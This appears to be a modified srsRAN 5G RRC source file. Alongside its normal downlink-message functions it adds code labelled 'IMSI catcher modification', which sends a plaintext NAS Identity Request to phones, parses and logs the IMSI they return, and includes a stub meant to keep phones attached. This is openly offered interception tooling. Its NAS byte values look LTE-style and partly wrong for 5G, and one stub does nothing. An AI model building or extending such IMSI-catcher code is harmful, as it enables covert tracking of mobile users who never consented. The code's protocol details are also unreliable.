/*
 *
 * Copyright 2021-2026 Software Radio Systems Limited
 *
 * This file is part of srsRAN.
 *
 * srsRAN is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * srsRAN is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * A copy of the GNU Affero General Public License can be found in
 * the LICENSE file in the top-level directory of this distribution
 * and at http://www.gnu.org/licenses/.
 *
 */

#include "rrc_ue_helpers.h"
#include "rrc_ue_impl.h"
#include "srsran/asn1/rrc_nr/dl_ccch_msg.h"
#include "srsran/asn1/rrc_nr/dl_dcch_msg.h"

using namespace srsran;
using namespace srs_cu_cp;
using namespace asn1::rrc_nr;

void rrc_ue_impl::send_dl_ccch(const dl_ccch_msg_s& dl_ccch_msg)
{
  // Pack DL CCCH msg.
  byte_buffer pdu = pack_into_pdu(dl_ccch_msg, "DL-CCCH-Message");

  // Log Tx message
  log_rrc_message(logger, Tx, pdu, dl_ccch_msg, srb_id_t::srb0, "CCCH DL");

  // Send down the stack.
  logger.log_debug(pdu.begin(), pdu.end(), "Tx {} PDU", srb_id_t::srb0);
  f1ap_pdu_notifier.on_new_rrc_pdu(srb_id_t::srb0, std::move(pdu));
}

void rrc_ue_impl::send_dl_dcch(srb_id_t srb_id, const dl_dcch_msg_s& dl_dcch_msg)
{
  if (context.srbs.find(srb_id) == context.srbs.end()) {
    logger.log_error("Dropping DlDcchMessage. Tx {} is not set up", srb_id);
    return;
  }

  // Pack DL CCCH msg.
  byte_buffer pdu = pack_into_pdu(dl_dcch_msg, "DL-DCCH-Message");

  // Log Tx message.
  log_rrc_message(logger, Tx, pdu, dl_dcch_msg, srb_id, "DCCH DL");

  // Pack PDCP PDU and send down the stack.
  auto pdcp_packing_result = context.srbs.at(srb_id).pack_rrc_pdu(std::move(pdu));
  if (!pdcp_packing_result.is_successful()) {
    logger.log_info("Requesting UE release. Cause: PDCP packing failed with {}",
                    pdcp_packing_result.get_failure_cause());
    on_ue_release_required(pdcp_packing_result.get_failure_cause());
    return;
  }

  byte_buffer pdcp_pdu = pdcp_packing_result.pop_pdu();
  logger.log_debug(pdcp_pdu.begin(), pdcp_pdu.end(), "Tx {} PDU", context.ue_index, context.c_rnti, srb_id);
  f1ap_pdu_notifier.on_new_rrc_pdu(srb_id, std::move(pdcp_pdu));
}

// IMSI catcher modification: Send identity request via NAS message
void rrc_ue_impl::send_identity_request()
{
  logger.log_info("Sending Identity Request to UE via NAS");
  
  // In NR, identity request is sent via NAS message
  // For IMSI catcher, we'll simulate this by sending a NAS Identity Request
  byte_buffer nas_pdu;
  
  // Create a simple NAS Identity Request message
  // Note: This is a simplified implementation
  if (!nas_pdu.append(0x07)) { // NAS Security Header (Plain NAS message)
    logger.log_error("Failed to append NAS Security Header");
    return;
  }
  if (!nas_pdu.append(0x40)) { // Identity Request message type
    logger.log_error("Failed to append Identity Request message type");
    return;
  }
  if (!nas_pdu.append(0x01)) { // Request type: IMSI
    logger.log_error("Failed to append Request type");
    return;
  }
  
  // Send via DL Info Transfer
  dl_dcch_msg_s dl_dcch_msg;
  dl_dcch_msg.msg.set_c1().set_dl_info_transfer().crit_exts.set_dl_info_transfer();
  dl_dcch_msg.msg.c1().dl_info_transfer().crit_exts.dl_info_transfer().ded_nas_msg = nas_pdu.copy();
  
  // Send the NAS message on SRB1
  send_dl_dcch(srb_id_t::srb1, dl_dcch_msg);
}

// IMSI catcher modification: Reject NR secondary cell activation
void rrc_ue_impl::reject_nr_secondary_cell_activation()
{
  logger.log_info("Rejecting NR secondary cell activation");
  
  // For IMSI catcher, we simply don't send any SCG activation requests
  // This prevents UE from attempting to activate secondary cells and potentially disconnecting
  // The function is a placeholder to demonstrate the intent
}

// IMSI catcher modification: Handle NAS messages for identity response
void rrc_ue_impl::handle_ul_info_transfer(const ul_info_transfer_ies_s& ul_info_transfer)
{
  logger.log_info("Received UL Info Transfer with NAS PDU");
  
  // Check if this is an identity response
  const byte_buffer& nas_pdu = ul_info_transfer.ded_nas_msg;
  if (nas_pdu.length() >= 2) {
    uint8_t msg_type = nas_pdu[1];
    if (msg_type == 0x41) { // Identity Response message type
      logger.log_info("Received Identity Response from UE");
      
      // Extract IMSI from NAS PDU
      // Note: This is a simplified implementation
      if (nas_pdu.length() > 3) {
        std::string imsi;
        for (size_t i = 3; i < nas_pdu.length(); i++) {
          uint8_t b = nas_pdu[i];
          imsi += std::to_string((b >> 4) & 0x0F);
          if ((b & 0x0F) != 0x0F) { // 0x0F is padding
            imsi += std::to_string(b & 0x0F);
          }
        }
        logger.log_info("Received IMSI: {}", imsi);
      }
    }
  }
  
  // Original functionality: forward to NGAP
  cu_cp_ul_nas_transport ul_nas_msg         = {};
  ul_nas_msg.ue_index                       = context.ue_index;
  ul_nas_msg.nas_pdu                        = ul_info_transfer.ded_nas_msg.copy();
  ul_nas_msg.user_location_info.nr_cgi      = context.cell.cgi;
  ul_nas_msg.user_location_info.tai.plmn_id = context.plmn_id;
  ul_nas_msg.user_location_info.tai.tac     = context.cell.tac;

  ngap_notifier.on_ul_nas_transport_message(ul_nas_msg);
}
